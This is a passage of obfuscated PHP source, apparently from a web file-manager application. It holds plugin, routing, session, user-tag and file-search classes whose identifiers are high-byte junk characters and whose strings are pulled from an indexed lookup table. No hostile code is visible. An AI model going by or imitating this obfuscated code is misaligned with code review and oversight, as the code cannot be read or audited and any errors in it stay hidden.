$ÂÎ¯ó¬ï); } public function onSetConfig($îüá¢â²) { } public function onGetConfig($Ò“ƒ¯“ƒ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Õ¢Ûè‰Í) { if ($Õ¢Ûè‰Í == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Áëá‘Ìñ = "\x70\x6c\x75\x67\x69\156\101\165\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $¤İ¿Ü‡ = $this->getConfig(); if (!$¤İ¿Ü‡[$Áëá‘Ìñ]) { return !1; } return ActionCall($_SERVER[™¸œØ®Ü][1713], $¤İ¿Ü‡[$Áëá‘Ìñ]); } public function url($¥Ÿ¼äÂÅ, $ÈçŠ¦ÚÖ = '', $æ È¼±é = true) { $÷ÖÕÙÓ =& $_SERVER[™¸œØ®Ü]; $Ñ½œæ©ï = $this->getConfig(); $¬”²ÏºÒ = KOD_VERSION . $÷ÖÕÙÓ[10] . KOD_VERSION_BUILD; $ûıº£¡£ = $this->packageVersion(); $Ä¥—˜ãô = $¬”²ÏºÒ . $÷ÖÕÙÓ[464] . $ûıº£¡£; if (substr($¥Ÿ¼äÂÅ, 0, 4) == $÷ÖÕÙÓ[152] || substr($¥Ÿ¼äÂÅ, 0, 2) == $÷ÖÕÙÓ[1430]) { $õ´Úµ”Ä = $¥Ÿ¼äÂÅ . $÷ÖÕÙÓ[1714] . $Ä¥—˜ãô; } else { if ($ÈçŠ¦ÚÖ == $÷ÖÕÙÓ[12]) { $õ´Úµ”Ä = $this->pluginHost . $¥Ÿ¼äÂÅ . $÷ÖÕÙÓ[1714] . $Ä¥—˜ãô; } else { if ($ÈçŠ¦ÚÖ === $÷ÖÕÙÓ[78]) { $õ´Úµ”Ä = $this->pluginHost . $¥Ÿ¼äÂÅ; } else { if ($ÈçŠ¦ÚÖ == $÷ÖÕÙÓ[1715]) { $õ´Úµ”Ä = STATIC_PATH . $¥Ÿ¼äÂÅ . $÷ÖÕÙÓ[1714] . $¬”²ÏºÒ; } else { if ($ÈçŠ¦ÚÖ == $÷ÖÕÙÓ[1716]) { $õ´Úµ”Ä = APP_HOST . $÷ÖÕÙÓ[1717] . $¥Ÿ¼äÂÅ . $÷ÖÕÙÓ[1714] . $¬”²ÏºÒ; } else { if (isset($Ñ½œæ©ï[$ÈçŠ¦ÚÖ])) { $õ´Úµ”Ä = $Ñ½œæ©ï[$ÈçŠ¦ÚÖ] . $¥Ÿ¼äÂÅ . $÷ÖÕÙÓ[1714] . $Ä¥—˜ãô; } } } } } } if (!$æ È¼±é) { return $õ´Úµ”Ä; } echo $õ´Úµ”Ä; } public function link($À¥¾¢˜ó = false, $Î´ÑÛ¸Ú = '') { $Á’Éı÷‘ =& $_SERVER[™¸œØ®Ü]; $Õêœ‰²í = $this->linkHas == !1; $this->linkHas = !0; if (!$À¥¾¢˜ó) { $this->link($Á’Éı÷‘[1718], $Á’Éı÷‘[1716]); $this->link($Á’Éı÷‘[1719], $Á’Éı÷‘[1715]); $this->link($Á’Éı÷‘[1720], $Á’Éı÷‘[1715]); $this->link($Á’Éı÷‘[1721], $Á’Éı÷‘[1715]); $this->link($Á’Éı÷‘[1722], $Á’Éı÷‘[1715]); if ($Õêœ‰²í) { Hook::trigger($Á’Éı÷‘[1723]); } return; } $µÌ“¤™ = $this->url($À¥¾¢˜ó, $Î´ÑÛ¸Ú, !1); if (substr($À¥¾¢˜ó, -3) == $Á’Éı÷‘[1724]) { echo $Á’Éı÷‘[1725] . $µÌ“¤™ . $Á’Éı÷‘[1726] . $Á’Éı÷‘[287]; } else { if (substr($À¥¾¢˜ó, -4) == $Á’Éı÷‘[1727]) { echo $Á’Éı÷‘[1728] . $µÌ“¤™ . $Á’Éı÷‘[1729] . $Á’Éı÷‘[287]; } } if ($Õêœ‰²í) { Hook::trigger($Á’Éı÷‘[1723]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\x79" => "\133\136\x2f\x5d\x2b", "\72\x6e\x75\155" => "\133\x30\55\71\135\x2b", "\x3a\x61\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($»Ş¡’£û, $¼Õ«ßÀš) { $æùÕ±¬å =& $_SERVER[™¸œØ®Ü]; if ($»Ş¡’£û == $æùÕ±¬å[1730]) { $ŠŞÓŠë = array_map($æùÕ±¬å[1731], $¼Õ«ßÀš[0]); $¿±³Şô = strpos($¼Õ«ßÀš[1], $æùÕ±¬å[8]) === 0 ? $¼Õ«ßÀš[1] : $æùÕ±¬å[8] . $¼Õ«ßÀš[1]; $”û·Ÿ“ë = $¼Õ«ßÀš[2]; } else { $ŠŞÓŠë = null; $¿±³Şô = strpos($¼Õ«ßÀš[0], $æùÕ±¬å[8]) === 0 ? $¼Õ«ßÀš[0] : $æùÕ±¬å[8] . $¼Õ«ßÀš[0]; $”û·Ÿ“ë = $¼Õ«ßÀš[1]; } array_push(self::$maps, $ŠŞÓŠë); array_push(self::$routes, $¿±³Şô); array_push(self::$methods, strtoupper($»Ş¡’£û)); array_push(self::$callbacks, $”û·Ÿ“ë); } public static function error($¯¨§Âèà) { self::$errorCallback = $¯¨§Âèà; } public static function haltOnMatch($Ÿ‘Û¯«û = true) { self::$halts = $Ÿ‘Û¯«û; } public static function dispatch() { $ùüïö·¦ =& $_SERVER[™¸œØ®Ü]; $òá‚ƒÁ± = parse_url($_SERVER[$ùüïö·¦[1732]], PHP_URL_PATH); $ĞµœåíÇ = $_SERVER[$ùüïö·¦[164]]; $³›†’¡Û = array_keys(static::$patterns); $˜½§ÌÒŸ = array_values(static::$patterns); $Ş³î = !1; self::$routes = preg_replace($ùüïö·¦[1380], $ùüïö·¦[8], self::$routes); if (in_array($òá‚ƒÁ±, self::$routes)) { $æ¥»È‘‡ = array_keys(self::$routes, $òá‚ƒÁ±); foreach ($æ¥»È‘‡ as $§™ş©“È) { if (self::$methods[$§™ş©“È] == $ĞµœåíÇ || self::$methods[$§™ş©“È] == $ùüïö·¦[1733] || in_array($ĞµœåíÇ, self::$maps[$§™ş©“È])) { $Ş³î = !0; if (!is_object(self::$callbacks[$§™ş©“È])) { $â¬ĞëÄ¡ = explode($ùüïö·¦[8], self::$callbacks[$§™ş©“È]); $²¥ášŞ = end($â¬ĞëÄ¡); $€œÎÅ¯ = explode($ùüïö·¦[1312], $²¥ášŞ); $¦Ü“…åş = new $€œÎÅ¯[0](); $¦Ü“…åş->{$€œÎÅ¯[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$§™ş©“È]); if (self::$halts) { return; } } } } } else { $ç êì•¢ = 0; foreach (self::$routes as $§™ş©“È) { if (strpos($§™ş©“È, $ùüïö·¦[4]) !== !1) { $§™ş©“È = str_replace($³›†’¡Û, $˜½§ÌÒŸ, $§™ş©“È); } if (preg_match($ùüïö·¦[1734] . $§™ş©“È . $ùüïö·¦[1735], $òá‚ƒÁ±, $àŒíÂÒ€)) { if (self::$methods[$ç êì•¢] == $ĞµœåíÇ || self::$methods[$ç êì•¢] == $ùüïö·¦[1733] || !empty(self::$maps[$ç êì•¢]) && in_array($ĞµœåíÇ, self::$maps[$ç êì•¢])) { $Ş³î = !0; array_shift($àŒíÂÒ€); if (!is_object(self::$callbacks[$ç êì•¢])) { $â¬ĞëÄ¡ = explode($ùüïö·¦[8], self::$callbacks[$ç êì•¢]); $²¥ášŞ = end($â¬ĞëÄ¡); $€œÎÅ¯ = explode($ùüïö·¦[1312], $²¥ášŞ); $¦Ü“…åş = new $€œÎÅ¯[0](); if (!method_exists($¦Ü“…åş, $€œÎÅ¯[1])) { echo $ùüïö·¦[1736]; } else { call_user_func_array(array($¦Ü“…åş, $€œÎÅ¯[1]), $àŒíÂÒ€); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ç êì•¢], $àŒíÂÒ€); if (self::$halts) { return; } } } } $ç êì•¢++; } } if ($Ş³î == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $³ı²¦ßÊ =& $_SERVER[™¸œØ®Ü]; header($_SERVER[$³ı²¦ßÊ[1737]] . $³ı²¦ßÊ[1738]); echo $³ı²¦ßÊ[1739]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ùüïö·¦[1732]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $üËøºÒë =& $_SERVER[™¸œØ®Ü]; static $ÓÀıÔõ‹ = false; if ($ÓÀıÔõ‹) { return $ÓÀıÔõ‹; } $İ—ë¥… = $GLOBALS[$üËøºÒë[6]][$üËøºÒë[426]]; self::$sessionTime = $İ—ë¥…[$üËøºÒë[1740]]; $ºçùÇö† = isset($GLOBALS[$üËøºÒë[1741]]) ? $GLOBALS[$üËøºÒë[1741]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ºçùÇö†)) { self::$sessionSign = Cookie::get($ºçùÇö†); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ºçùÇö†, self::$sessionSign, self::$sessionTime); $ôÀæ¦Øé = $İ—ë¥…[$üËøºÒë[1742]]; $š‹õ¡À¬ = $İ—ë¥…[$ôÀæ¦Øé]; $ƒ®÷Œæë = $İ—ë¥…[$üËøºÒë[918]]; switch ($ôÀæ¦Øé) { case $üËøºÒë[21]: self::$handle = Model($üËøºÒë[919]); break; case $üËøºÒë[920]: self::$handle = new CacheRedis($š‹õ¡À¬, $ƒ®÷Œæë); break; case $üËøºÒë[921]: self::$handle = new CacheMemcached($š‹õ¡À¬, $ƒ®÷Œæë); break; case $üËøºÒë[232]: $š‹õ¡À¬[$üËøºÒë[87]] = $š‹õ¡À¬[$üËøºÒë[87]] . $üËøºÒë[1743]; self::$handle = new CacheFile($š‹õ¡À¬, $ƒ®÷Œæë); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÓÀıÔõ‹ = new self(); return $ÓÀıÔõ‹; } public static function getBySign($Œ‘Ğ¥ô÷) { $ê–¥øÆ = self::$handle->get($Œ‘Ğ¥ô÷); $ê–¥øÆ = unserialize($ê–¥øÆ); return is_array($ê–¥øÆ) ? $ê–¥øÆ : array(); } public static function setBySign($Åòáö§, $•şÂ†Ó¼) { CacheLock::lock($Åòáö§); self::$handle->set($Åòáö§, serialize($•şÂ†Ó¼), self::$sessionTime); CacheLock::unlock($Åòáö§); } public static function sign($ê®ı»ü¥ = false) { if ($ê®ı»ü¥) { self::$sessionSign = $ê®ı»ü¥; } self::init(); return self::$sessionSign; } public static function set($Éöáô«í, $®ôÕ™Õ = false) { self::init(); if (is_array($Éöáô«í)) { foreach ($Éöáô«í as $ßã‚ºÏá => $åˆ¾¬şÀ) { array_set_value(self::$data, $ßã‚ºÏá, $åˆ¾¬şÀ); } } else { array_set_value(self::$data, $Éöáô«í, $®ôÕ™Õ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ãèü©‚´ = false) { self::init(); if (!$ãèü©‚´) { return self::$data; } return array_get_value(self::$data, $ãèü©‚´); } public static function remove($ŞŞËÂ) { self::init(); unset(self::$data[$ŞŞËÂ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[™¸œØ®Ü][924])) { self::$handle->clearTimeout(); } } } goto eØÌ”›‰‰À; C¼¯›Ç¥õš: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\157\x70\164\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($—Û»š¶Ù) { $÷•‹õµ =& $_SERVER[™¸œØ®Ü]; $ÎÁ‘¥âë = defined($÷•‹õµ[2226]) && USER_ID ? USER_ID : $÷•‹õµ[12]; return "\x55\x73\145\x72\117\160\164\x69\157\x6e\x5f{$—Û»š¶Ù}\137" . $ÎÁ‘¥âë; } protected function filterWhere($™ŠÏøô¨) { $Ú»…ÛŞÌ =& $_SERVER[™¸œØ®Ü]; $™ŠÏøô¨[$Ú»…ÛŞÌ[1795]] = defined($Ú»…ÛŞÌ[2226]) && USER_ID ? USER_ID : $Ú»…ÛŞÌ[12]; return $™ŠÏøô¨; } public function cacheRemoveUser($·¼Ä‹ÉÓ, $¦Ÿ·¯½Å) { return Cache::remove("\x55\x73\145\x72\x4f\x70\x74\151\x6f\156\137{$·¼Ä‹ÉÓ}\137" . $¦Ÿ·¯½Å); } protected function optionDefault($œœƒƒ¹Å = '') { $úú®»¯¦ =& $_SERVER[™¸œØ®Ü]; if ($œœƒƒ¹Å == $úú®»¯¦[12]) { return $GLOBALS[$úú®»¯¦[6]][$úú®»¯¦[2537]]; } if ($œœƒƒ¹Å == $úú®»¯¦[2538]) { return $GLOBALS[$úú®»¯¦[6]][$úú®»¯¦[2539]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\164\141\x67\x4c\x69\163\x74"; public $modelType = "\125\x73\x65\162\x4f\160\164\151\157\156"; public $field = array("\x6e\141\x6d\x65", "\163\x74\171\x6c\x65", "\163\x6f\x72\164"); public function listData($‚‹ùò = false, $©¬Ìí¼ = "\163\157\x72\x74", $ƒõ”½‡ê = false) { return parent::listData($‚‹ùò, $©¬Ìí¼, $ƒõ”½‡ê); } public function remove($¾©Ø×) { return parent::remove($¾©Ø×); } public function add($¤Ááã†·, $¶óúæ‚ = "\154\x61\142\x65\154\55\147\x72\x65\171\55\x6e\x6f\x72\x6d\141\x6c") { $‡‘ùâœ‚ =& $_SERVER[™¸œØ®Ü]; if ($this->findByName($¤Ááã†·)) { return !1; } $’ÃáÊŸÜ = array($‡‘ùâœ‚[496] => $¤Ááã†·, $‡‘ùâœ‚[562] => $¶óúæ‚, $‡‘ùâœ‚[2000] => $this->getSort($‡‘ùâœ‚[337]) + 1); return parent::insert($’ÃáÊŸÜ); } public function update($¢õøÍê§, $¸œÆı““) { $À³€Éœß =& $_SERVER[™¸œØ®Ü]; $µ²ˆ…ô = $this->listData($¢õøÍê§); $îÛ‚ŒÏÃ = $this->findByName($¸œÆı““[$À³€Éœß[32]]); if (!$µ²ˆ…ô || $îÛ‚ŒÏÃ && $îÛ‚ŒÏÃ[$À³€Éœß[477]] != $µ²ˆ…ô[$À³€Éœß[477]]) { return !1; } return parent::update($¢õøÍê§, $¸œÆı““); } public function moveTop($µ°ó†„) { $Î¬Ş½ =& $_SERVER[™¸œØ®Ü]; $´Å¤ö– = parent::listData(); $ £Íšé¥ = $this->getSort($Î¬Ş½[336]); foreach ($´Å¤ö– as &$¹»äõì¹) { if ($¹»äõì¹[$Î¬Ş½[477]] == $µ°ó†„) { $¹»äõì¹[$Î¬Ş½[2020]] = $ £Íšé¥; continue; } $¹»äõì¹[$Î¬Ş½[2020]] += 1; } unset($¹»äõì¹); return parent::resetData($´Å¤ö–); } public function moveBottom($è¯Ø¹Â³) { $ûÍŸ”Ã… =& $_SERVER[™¸œØ®Ü]; $±–èı²„ = $this->getSort($ûÍŸ”Ã…[337]) + 1; return parent::update($è¯Ø¹Â³, array($ûÍŸ”Ã…[2020] => $±–èı²„)); } public function resetSort($ºî±Œˆ) { $ÛŠ½Ï·å =& $_SERVER[™¸œØ®Ü]; $×‹ ©Ñ± = array(); $ºî±Œˆ = is_array($ºî±Œˆ) ? $ºî±Œˆ : array(); for ($®¬è„†® = 0; $®¬è„†® < count($ºî±Œˆ); $®¬è„†®++) { $×‹ ©Ñ±[$ºî±Œˆ[$®¬è„†®] . $ÛŠ½Ï·å[12]] = $®¬è„†® + 1; } $¾ù‚Ûı = parent::listData(); foreach ($¾ù‚Ûı as &$ãŠñÎ») { $«ŠßÈ·ğ = $×‹ ©Ñ±[$ãŠñÎ»[$ÛŠ½Ï·å[477]]]; $ãŠñÎ»[$ÛŠ½Ï·å[2020]] = $«ŠßÈ·ğ ? $«ŠßÈ·ğ : $ãŠñÎ»[$ÛŠ½Ï·å[2020]]; } unset($ãŠñÎ»); return parent::resetData($¾ù‚Ûı); } private function getSort($õ™¦Ø¿¬) { $¤ùæÂ» =& $_SERVER[™¸œØ®Ü]; $öŒšÆ½í = parent::listData(); $Á¥×ÈÖ¨ = array_to_keyvalue($öŒšÆ½í, $¤ùæÂ»[12], $¤ùæÂ»[2020]); if (!$Á¥×ÈÖ¨) { $Á¥×ÈÖ¨ = array(0); } $ÜÄå©Äœ = $õ™¦Ø¿¬ == $¤ùæÂ»[337] ? max($Á¥×ÈÖ¨) : min($Á¥×ÈÖ¨); return intval($ÜÄå©Äœ); } } goto fÄ‰†‰œ®¼; Fµâ×ëÑ©ä: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ı•‚µ¡Ô) { $Øşòµ— =& $_SERVER[™¸œØ®Ü]; $Í¿”éü = KodIO::fileTypeList(); $äò¿ëÓ = $Í¿”éü[$ı•‚µ¡Ô]; if (!$äò¿ëÓ) { return array(); } $ÉÇşı×— = $äò¿ëÓ[$Øşòµ—[169]]; $„®¸÷‰ó = $Øşòµ—[7]; if (!$äò¿ëÓ[$Øşòµ—[169]]) { $ê÷Éïæİ = array_to_keyvalue($Í¿”éü, $Øşòµ—[12], $Øşòµ—[169]); $ÉÇşı×— = implode($Øşòµ—[50], $ê÷Éïæİ); $„®¸÷‰ó = $Øşòµ—[2263]; } $ ¸ƒÆ¹· = explode($Øşòµ—[50], trim($ÉÇşı×—, $Øşòµ—[50])); return array($„®¸÷‰ó, $ ¸ƒÆ¹·); } public function listPathType($ÛºæÆÌğ) { $¼Á…•› =& $_SERVER[™¸œØ®Ü]; $•Ôï¤€  = $this->fileTypeWhere($ÛºæÆÌğ); if (!$•Ôï¤€ ) { return array(); } $üÃƒéí = USER_ID; $åŒ¸£î = Model($¼Á…•›[601])->getInfo($üÃƒéí); $µ„…ğ°è = array($¼Á…•›[655] => SourceModel::TYPE_USER, $¼Á…•›[588] => array($¼Á…•›[619], $¼Á…•›[597] . $åŒ¸£î[$¼Á…•›[90]][$¼Á…•›[193]] . $¼Á…•›[620]), $¼Á…•›[656] => $üÃƒéí, $¼Á…•›[653] => 0, $¼Á…•›[654] => $•Ôï¤€ ); return $this->listSource($µ„…ğ°è); } public function listSearch($¿ùìÂ‘î, $Í Ëì» = 300) { $…ÛÆÁª =& $_SERVER[™¸œØ®Ü]; if (isset($¿ùìÂ‘î[$…ÛÆÁª[2094]]) && $¿ùìÂ‘î[$…ÛÆÁª[2094]]) { $¿ùìÂ‘î[$…ÛÆÁª[2094]] = str_replace($…ÛÆÁª[462], $…ÛÆÁª[2264], trim($¿ùìÂ‘î[$…ÛÆÁª[2094]])); } $­Â×§Ä = $this->_parseSearchWhere($¿ùìÂ‘î); if (!isset($­Â×§Ä[$…ÛÆÁª[507]])) { $­Â×§Ä[$…ÛÆÁª[507]] = 0; } $šï¼èÁÇ = $…ÛÆÁª[2265]; $¤Ë¶ÚÂ = $­Â×§Ä; $¼ÂİµÖ´ = $šï¼èÁÇ; $this->_listSearchBindPinyin($¿ùìÂ‘î, $­Â×§Ä, $šï¼èÁÇ); $this->alias($…ÛÆÁª[521])->_makeOrder(); $­Â×§Ä = $this->parseWhereLike($­Â×§Ä); $Î›³ÏïÁ = $this->distinct(!0)->field($šï¼èÁÇ)->where($­Â×§Ä)->selectPage($Í Ëì»); if ($GLOBALS[$…ÛÆÁª[6]][$…ÛÆÁª[459]][$…ÛÆÁª[460]] && Input::check($¿ùìÂ‘î[$…ÛÆÁª[2094]], $…ÛÆÁª[662]) && $Î›³ÏïÁ[$…ÛÆÁª[444]][$…ÛÆÁª[430]] == 1 && $Î›³ÏïÁ[$…ÛÆÁª[444]][$…ÛÆÁª[445]] == 0) { $Î›³ÏïÁ = $this->distinct(!0)->field($šï¼èÁÇ)->where($¤Ë¶ÚÂ)->limit(1000)->select(); $Î›³ÏïÁ = array_page_split($Î›³ÏïÁ, !1, $Í Ëì»); } $this->_listSearchFileContent($Î›³ÏïÁ, $¿ùìÂ‘î, $¼ÂİµÖ´, $¤Ë¶ÚÂ); $this->_listSearchDesc($Î›³ÏïÁ, $¿ùìÂ‘î, $¼ÂİµÖ´); $this->_listSearchTag($Î›³ÏïÁ, $¿ùìÂ‘î, $¼ÂİµÖ´); $this->_listSearchGroupTag($Î›³ÏïÁ, $¿ùìÂ‘î, $¼ÂİµÖ´); $this->_listDataApply($Î›³ÏïÁ[$…ÛÆÁª[447]]); $this->_listMake($Î›³ÏïÁ); return $Î›³ÏïÁ; } private function _listSearchFileContent(&$Ï¡ó“Æ, $çšı­‡§, $ò‰ã³øõ, $¦ë£ùğƒ) { $˜ëÛ·£½ =& $_SERVER[™¸œØ®Ü]; if (!$çšı­‡§[$˜ëÛ·£½[2094]] || $Ï¡ó“Æ[$˜ëÛ·£½[444]][$˜ëÛ·£½[430]] > 1) { return; } if (!isset($¦ë£ùğƒ[$˜ëÛ·£½[32]]) || !is_array($çšı­‡§[$˜ëÛ·£½[545]])) { return; } $¦ë£ùğƒ[$˜ëÛ·£½[545]] = array($˜ëÛ·£½[7], $çšı­‡§[$˜ëÛ·£½[545]]); unset($¦ë£ùğƒ[$˜ëÛ·£½[32]]); unset($çšı­‡§[$˜ëÛ·£½[545]]); $ò·Øœ¬ = $this->field($ò‰ã³øõ)->where($¦ë£ùğƒ)->limit($˜ëÛ·£½[2266])->select(); if (!$ò·Øœ¬ || count($ò·Øœ¬) == 0) { return; } $Ï¡ó“Æ[$˜ëÛ·£½[447]] = array_merge($ò·Øœ¬, $Ï¡ó“Æ[$˜ëÛ·£½[447]]); $Ï¡ó“Æ[$˜ëÛ·£½[444]][$˜ëÛ·£½[445]] += count($ò·Øœ¬); } private function _listSearchTag(&$ğã‡—, $¨ïá³“, $­¥•ÆÏ) { $º¦€ìÒ¤ =& $_SERVER[™¸œØ®Ü]; if (!isset($¨ïá³“[$º¦€ìÒ¤[2267]])) { return; } if (!$¨ïá³“[$º¦€ìÒ¤[2094]] || $ğã‡—[$º¦€ìÒ¤[444]][$º¦€ìÒ¤[430]] > 1) { return; } $Á÷õäíı = Model($º¦€ìÒ¤[2268])->listData(); $©ŒÎ®™ã = array(); $‘›éîÚÇ = $¨ïá³“[$º¦€ìÒ¤[2094]]; foreach ($Á÷õäíı as $İ¾µ„ñÀ) { $ëå›­¼ = $İ¾µ„ñÀ[$º¦€ìÒ¤[32]]; $Ø¼ß³ºŒ = str_replace($º¦€ìÒ¤[53], $º¦€ìÒ¤[12], Pinyin::get($ëå›­¼)); if (stripos($ëå›­¼, $‘›éîÚÇ) !== !1 || stripos($Ø¼ß³ºŒ, $‘›éîÚÇ) !== !1) { $©ŒÎ®™ã[] = $İ¾µ„ñÀ[$º¦€ìÒ¤[477]]; } } if (!$©ŒÎ®™ã) { return; } $ºæáå„ô = array($º¦€ìÒ¤[502] => array($º¦€ìÒ¤[7], $©ŒÎ®™ã), $º¦€ìÒ¤[1795] => USER_ID); $¼ÑÖê±Ù = Model($º¦€ìÒ¤[504])->field($º¦€ìÒ¤[87])->where($ºæáå„ô)->select(); $¼ÑÖê±Ù = array_to_keyvalue($¼ÑÖê±Ù, $º¦€ìÒ¤[12], $º¦€ìÒ¤[87]); $îÀãÖÓ– = array_unique($¼ÑÖê±Ù); $this->_listSearchMerge($ğã‡—, $¨ïá³“, $­¥•ÆÏ, $îÀãÖÓ–); } private function _listSearchDesc(&$÷¸ú¡â£, $È½ºå¾», $Ôˆ•ï„í) { $ÉÕİ˜œ =& $_SERVER[™¸œØ®Ü]; if (!isset($È½ºå¾»[$ÉÕİ˜œ[528]])) { return; } if (!$È½ºå¾»[$ÉÕİ˜œ[2094]] || $÷¸ú¡â£[$ÉÕİ˜œ[444]][$ÉÕİ˜œ[430]] > 1) { return; } $²’ÃòÍó = array($ÉÕİ˜œ[97] => $ÉÕİ˜œ[528], $ÉÕİ˜œ[452] => array($ÉÕİ˜œ[461], $ÉÕİ˜œ[2096] . $È½ºå¾»[$ÉÕİ˜œ[2094]] . $ÉÕİ˜œ[2096])); $™Ä„‘° = !1; if ($™Ä„‘°) { $ç¥û›À = $this->listSearchChildren($È½ºå¾»[$ÉÕİ˜œ[192]]); $ç¥û›À = array_unique($ç¥û›À); if (!$ç¥û›À) { return; } $²’ÃòÍó[$ÉÕİ˜œ[193]] = array($ÉÕİ˜œ[7], $ç¥û›À); } $öòĞ‚‹Ì = Model($ÉÕİ˜œ[639])->field($ÉÕİ˜œ[193])->where($²’ÃòÍó)->limit(5000)->select(); $†ÍİœÚ  = array_to_keyvalue($öòĞ‚‹Ì, $ÉÕİ˜œ[12], $ÉÕİ˜œ[193]); $this->_listSearchMerge($÷¸ú¡â£, $È½ºå¾», $Ôˆ•ï„í, $†ÍİœÚ ); } private function _listSearchGroupTag(&$òÇÑ³‰í, $İÛÓ¥„», $¾Ìıá¤ı) { $êç±ğÁÜ =& $_SERVER[™¸œØ®Ü]; if (!isset($İÛÓ¥„»[$êç±ğÁÜ[2267]])) { return; } if (!$İÛÓ¥„»[$êç±ğÁÜ[2094]] || $òÇÑ³‰í[$êç±ğÁÜ[444]][$êç±ğÁÜ[430]] > 1 || !$İÛÓ¥„»[$êç±ğÁÜ[192]]) { return; } $õäÜµ÷ñ = $this->sourceInfo($İÛÓ¥„»[$êç±ğÁÜ[192]]); if (!$õäÜµ÷ñ || $õäÜµ÷ñ[$êç±ğÁÜ[190]] != SourceModel::TYPE_GROUP) { return; } $İÖ¬±¸İ = $õäÜµ÷ñ[$êç±ğÁÜ[573]]; $£âö”ˆà = Model($êç±ğÁÜ[2269])->get($İÖ¬±¸İ); $Á×‚ãƒß = array(); $üæÁ•êÎ = $İÛÓ¥„»[$êç±ğÁÜ[2094]]; foreach ($£âö”ˆà[$êç±ğÁÜ[447]] as $ßÅåìÔ) { $Ï¤¢¹ª = $ßÅåìÔ[$êç±ğÁÜ[32]]; $“Ï¶Ìü™ = str_replace($êç±ğÁÜ[53], $êç±ğÁÜ[12], Pinyin::get($Ï¤¢¹ª)); if (stripos($Ï¤¢¹ª, $üæÁ•êÎ) !== !1 || stripos($“Ï¶Ìü™, $üæÁ•êÎ) !== !1) { $Á×‚ãƒß[] = $ßÅåìÔ[$êç±ğÁÜ[477]]; } } if (!$Á×‚ãƒß) { return; } $ÂÜ‘¦”Ù = array($êç±ğÁÜ[502] => array($êç±ğÁÜ[7], $Á×‚ãƒß), $êç±ğÁÜ[1795] => 0, $êç±ğÁÜ[33] => $êç±ğÁÜ[2116] . $İÖ¬±¸İ); $µÒ½€« = Model($êç±ğÁÜ[504])->field($êç±ğÁÜ[87])->where($ÂÜ‘¦”Ù)->select(); $µÒ½€« = array_to_keyvalue($µÒ½€«, $êç±ğÁÜ[12], $êç±ğÁÜ[87]); $ş¶–îö‚ = array_unique($µÒ½€«); $this->_listSearchMerge($òÇÑ³‰í, $İÛÓ¥„», $¾Ìıá¤ı, $ş¶–îö‚); } private function _listSearchMerge(&$çş³™°, $°±ıäóÇ, $ï—æÖğñ, $Õ’´¶) { $ö¡²¯¦“ =& $_SERVER[™¸œØ®Ü]; if (!$Õ’´¶) { return; } $âµŒ»€Ã = array_to_keyvalue($çş³™°[$ö¡²¯¦“[447]], $ö¡²¯¦“[12], $ö¡²¯¦“[193]); $óƒÀŒŸ = array_diff($Õ’´¶, $âµŒ»€Ã); if (!$óƒÀŒŸ) { return; } $ñú¼£îÙ = array($ö¡²¯¦“[193] => array($ö¡²¯¦“[7], $óƒÀŒŸ)); $ù‰µÕšö = $this->field($ï—æÖğñ)->where($ñú¼£îÙ)->select(); if (!$ù‰µÕšö) { return; } $á¤Ú›Øù = array(); foreach ($ù‰µÕšö as $Ëë«œ°) { if ($this->_listSearchFilter($Ëë«œ°, $°±ıäóÇ)) { $á¤Ú›Øù[] = $Ëë«œ°; } } $çş³™°[$ö¡²¯¦“[447]] = array_merge($á¤Ú›Øù, $çş³™°[$ö¡²¯¦“[447]]); $çş³™°[$ö¡²¯¦“[444]][$ö¡²¯¦“[445]] += count($á¤Ú›Øù); } private function _listSearchFilter($ß´Ÿ¸ß, $Ø„Ê´ìı) { $âÍüı =& $_SERVER[™¸œØ®Ü]; $ Ì­ÑÉĞ = $ß´Ÿ¸ß[$âÍüı[487]] == $âÍüı[91]; if (!strstr($ß´Ÿ¸ß[$âÍüı[588]], $âÍüı[50] . $Ø„Ê´ìı[$âÍüı[192]] . $âÍüı[50])) { return !1; } if (isset($Ø„Ê´ìı[$âÍüı[488]]) && $Ø„Ê´ìı[$âÍüı[488]] != $âÍüı[861]) { if ($Ø„Ê´ìı[$âÍüı[488]] == $âÍüı[78] && !$ Ì­ÑÉĞ) { return !1; } if ($Ø„Ê´ìı[$âÍüı[488]] != $âÍüı[78] && $ Ì­ÑÉĞ) { return !1; } if (!strstr($ß´Ÿ¸ß[$âÍüı[169]], $âÍüı[50] . $Ø„Ê´ìı[$âÍüı[488]] . $âÍüı[50])) { return !1; } } if (isset($Ø„Ê´ìı[$âÍüı[2270]]) && $Ø„Ê´ìı[$âÍüı[2270]] < $ß´Ÿ¸ß[$âÍüı[79]]) { return !1; } if (isset($Ø„Ê´ìı[$âÍüı[2271]]) && $Ø„Ê´ìı[$âÍüı[2271]] > $ß´Ÿ¸ß[$âÍüı[79]]) { return !1; } if (isset($Ø„Ê´ìı[$âÍüı[669]]) && $Ø„Ê´ìı[$âÍüı[669]] != $ß´Ÿ¸ß[$âÍüı[531]]) { return 